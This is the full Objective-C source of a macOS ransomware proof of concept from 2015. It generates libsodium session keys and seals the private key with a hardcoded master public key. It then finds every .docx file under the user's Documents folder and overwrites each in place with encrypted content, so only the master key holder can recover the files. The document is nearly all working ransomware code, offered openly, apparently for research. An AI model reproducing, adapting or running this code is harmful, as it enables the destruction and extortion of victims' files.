/*
 *   ________              .__
 *  /  _____/  ____ ______ |  |__   ___________
 * /   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \
 * \    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/
 *  \______  /\____/|   __/|___|  /\___  >__|
 *         \/       |__|        \/     \/
 *
 * OS X Ransomware Proof of Concept
 *
 * Created by fG! on 26/05/15.
 *
 * Copyright (c) 2015 fG!. All rights reserved.
 * reverser@put.as - https://reverse.put.as
 *
 * main.m
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#import <Foundation/Foundation.h>
#include "sodium.h"
#include <sys/stat.h>

#define ERROR_MSG(fmt, ...) fprintf(stderr, "[ERROR] " fmt " \n", ## __VA_ARGS__)
#define OUTPUT_MSG(fmt, ...) fprintf(stdout, fmt " \n", ## __VA_ARGS__)
#if DEBUG == 0
#   define DEBUG_MSG(fmt, ...) do {} while (0)
#else
#   define DEBUG_MSG(fmt, ...) fprintf(stdout, "[DEBUG] " fmt "\n", ## __VA_ARGS__)
#endif

#define MESSAGE_LEN (crypto_box_SECRETKEYBYTES)
#define CIPHERTEXT_LEN (crypto_box_SEALBYTES + crypto_box_SECRETKEYBYTES)

/* the master key that will be used to encrypt the session private key */
unsigned char master_pub_key[crypto_box_PUBLICKEYBYTES] = "\x2f\x06\x6c\xd5\x2a\x0f\xfd\x10\xef\x5c\xe8\x8f\x17\x9d\xda\x68\x4f\xca\x06\x78\x19\x81\x6b\x4f\x5e\x74\xa1\xd4\xf6\x1d\x11\x45";
unsigned char master_priv_key[crypto_box_SECRETKEYBYTES] = "\x7d\xfe\xf8\x68\xd9\xc4\x43\x82\x1b\x6b\x45\x59\xac\xc8\xb6\x07\x7f\x5b\x92\x80\x0c\x69\x3e\xbf\x14\xaa\x6b\xbd\x34\x57\xf9\x0f";

/* the session generated key pair */
unsigned char session_pub_key[crypto_box_PUBLICKEYBYTES];
unsigned char session_priv_key[crypto_box_SECRETKEYBYTES];

/*
 * generate a master key
 * the master private key is what allows to decrypt the session keys
 * so in theory the cryptoware victim would have to send the encrypted private session key
 * and in return it would receive the decrypted version so it could decrypt the files
 */
void
generate_master_key(void)
{
    unsigned char pubkey[crypto_box_PUBLICKEYBYTES] = {0};
    unsigned char privkey[crypto_box_SECRETKEYBYTES] = {0};
    int ret = 0;
    /* generate the session key */
    ret = crypto_box_keypair(pubkey, privkey);
    DEBUG_MSG("crypto_box_keypair result: %d", ret);
    DEBUG_MSG("Master public key:");
    for (uint32_t i = 0; i < crypto_box_PUBLICKEYBYTES; i++)
    {
        printf("\\x%02x", pubkey[i]);
    }
    printf("\n");
    DEBUG_MSG("Public key size is: %d", crypto_box_PUBLICKEYBYTES);
    DEBUG_MSG("Master private key:");
    for (uint32_t x = 0; x < crypto_box_SECRETKEYBYTES; x++)
    {
        printf("\\x%02x", privkey[x]);
    }
    printf("\n");
    DEBUG_MSG("Private key size is: %d", crypto_box_SECRETKEYBYTES);
}

/*
 * debug function to verify if encrypted key can be decrypted correctly
 */
void
decrypt_session_encrypted_key(unsigned char *encrypted_key, unsigned char *original_key)
{
    unsigned char decrypted_key[MESSAGE_LEN] = {0};
    int ret = 0;
    ret = crypto_box_seal_open(decrypted_key, encrypted_key, CIPHERTEXT_LEN, master_pub_key, master_priv_key);
    DEBUG_MSG("crypto_box_seal_open result: %d", ret);
    DEBUG_MSG("Decrypted private key:");
    for (uint32_t x = 0; x < MESSAGE_LEN; x++)
    {
        printf("%02x", decrypted_key[x]);
    }
    printf("\n");
    ret = memcmp(decrypted_key, original_key, MESSAGE_LEN);
    DEBUG_MSG("memcmp result: %d", ret);
}

int main(int argc, const char * argv[]) {
    @autoreleasepool
    {
        int action = -1;
        
        if (argc < 2)
        {
            ERROR_MSG("Please set an option...");
            return EXIT_FAILURE;
        }
        if (sodium_init() == -1)
        {
            ERROR_MSG("Can't initialize libsodium!");
            return EXIT_FAILURE;
        }
        /* XXX: incomplete options, default is to encrypt
         * other than that we have -g to generate master keys
         * that we should then import into the source code
         */
        if (strcmp(argv[1], "-e") == 0)
        {
            action = 1;
        }
        /* XXX: decryption for now handled with separate binary */
        else if (strcmp(argv[1], "-d") == 0)
        {
            action = 0;
        }
        else if (strcmp(argv[1], "-g") == 0)
        {
            generate_master_key();
            return EXIT_SUCCESS;
        }
        else
        {
            ERROR_MSG("Unknown option!");
            return EXIT_FAILURE;
        }
        
        int ret = 0;
        
        /* generate the session key
         * this is the key that will be used to encrypt all the files
         * we encrypt its private key with our public key and delete it
         * this means that the only way to decrypt files is to hold the master key,
         * decrypt the session private key and then use it to decrypt the files
         * this means that we don't need to generate the per machine key and
         * transmit it back to a C&C server
         * we just need to leave the encrypted private keys in the filesystem
         */
        ret = crypto_box_keypair(session_pub_key, session_priv_key);
        DEBUG_MSG("crypto_box_keypair result: %d", ret);
        DEBUG_MSG("Session public key:");
        for (uint32_t i = 0; i < crypto_box_PUBLICKEYBYTES; i++)
        {
            printf("\\x%02x", session_pub_key[i]);
        }
        printf("\n");
        DEBUG_MSG("Session private key:");
        for (uint32_t i = 0; i < crypto_box_SECRETKEYBYTES; i++)
        {
            printf("\\x%02x", session_priv_key[i]);
        }
        printf("\n");
        /* encrypt the private session key */
        unsigned char encrypted_key[CIPHERTEXT_LEN] = {0};
        ret = crypto_box_seal(encrypted_key, session_priv_key, MESSAGE_LEN, master_pub_key);
        DEBUG_MSG("crypto_box_seal result: %d", ret);
        DEBUG_MSG("Encrypted session key bytes:");
        for (uint32_t i = 0; i < CIPHERTEXT_LEN; i++)
        {
            printf("%02x", encrypted_key[i]);
        }
        printf("\n");
#if DEBUG
        /* DEBUG FEATURE to see if encrypted key is good */
        decrypt_session_encrypted_key(encrypted_key, session_priv_key);
#endif
        /* destroy the private session key - we don't need anymore and don't want it recovered */
        sodium_memzero(session_priv_key, MESSAGE_LEN);
        
        /* now we can search and encrypt any files we want */
        
        /* first we have to find the target files */

        /* ****** DANGER!!!! ******
         * THIS IS SEARCHING AND ENCRYPTING ALL THE .DOCX FOUND AT ~/Documents FOLDER
         * RUN THIS ONLY ON A VM ;-)
         */
        NSFileManager *fm = [[NSFileManager alloc] init];
        NSLog(@"%@", NSHomeDirectory());
        NSString *targetFolder = [NSString stringWithFormat:@"%@/%@", NSHomeDirectory(), @"/Documents"];
        NSDirectoryEnumerator *dirEnum = [fm enumeratorAtPath:targetFolder];
        NSString *file;
        NSMutableArray *targetFiles = [NSMutableArray arrayWithCapacity:0];
        while ((file = [dirEnum nextObject])) {
            BOOL isDir = NO;
            NSString *filePath = [NSString stringWithFormat:@"%@/%@", targetFolder, file];
            if ([fm fileExistsAtPath:filePath isDirectory:&isDir])
            {
                if (isDir == NO)
                {
                    NSString *extension = [[NSURL fileURLWithPath:filePath] pathExtension];
                    if ([extension isEqualToString:@"docx"] == YES)
                    {
                        [targetFiles addObject:filePath];
                    }
                }
            }
            
        }
        
        /* then we encrypt it with crypto_box_seal */
        for (id object in targetFiles)
        {
            NSLog(@"Target is %@", object);
            int fd = 0;
            fd = open([object UTF8String], O_RDWR);
            if (fd < 0)
            {
                ERROR_MSG("Failed to open target.");
            }
            struct stat filestat = {0};
            fstat(fd, &filestat);
            unsigned char *source_buf = mmap(0, filestat.st_size, PROT_READ, MAP_SHARED, fd, 0);
            unsigned char *buf = malloc(filestat.st_size + crypto_box_SEALBYTES);
            ret = crypto_box_seal(buf, source_buf, filestat.st_size, session_pub_key);
            /* and overwrite them */
            if (ret == 0)
            {
                DEBUG_MSG("Success encrypting!");
                munmap(source_buf, filestat.st_size);
                lseek(fd, 0, SEEK_SET);
                /* write the encrypted contents plus the seal bvytes */
                write(fd, buf, filestat.st_size + crypto_box_SEALBYTES);
                close(fd);
            }
        }

        /* write the session keys */
        int key_fd = 0;
        key_fd = open("./session_pub.key", O_RDWR | O_CREAT | O_TRUNC, 0600);
        if (key_fd < 0)
        {
            ERROR_MSG("Can't save session public key.");
            return EXIT_FAILURE;
        }
        write(key_fd, session_pub_key, crypto_box_PUBLICKEYBYTES);
        close(key_fd);
        key_fd = open("./session_private.key", O_RDWR | O_CREAT | O_TRUNC, 0600);
        if (key_fd < 0)
        {
            ERROR_MSG("Can't save session private key.");
            return EXIT_FAILURE;
        }
        write(key_fd, encrypted_key, CIPHERTEXT_LEN);
        close(key_fd);
    }
    
    DEBUG_MSG("All done, merry christmas!");
    
    return 0;
}
